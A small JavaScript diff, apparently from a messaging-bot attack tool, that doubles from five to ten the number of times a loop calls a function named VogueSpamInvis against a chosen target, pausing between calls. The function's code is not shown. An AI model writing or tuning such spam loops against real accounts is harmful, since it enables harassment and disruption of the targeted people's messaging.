@@ -3670,7 +3670,7 @@ Status      : Success
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 5; i++) {
+            for (let i = 0; i < 10; i++) {
                 try {
                     await VogueSpamInvis(sock, target);
                     await sleep(1500)
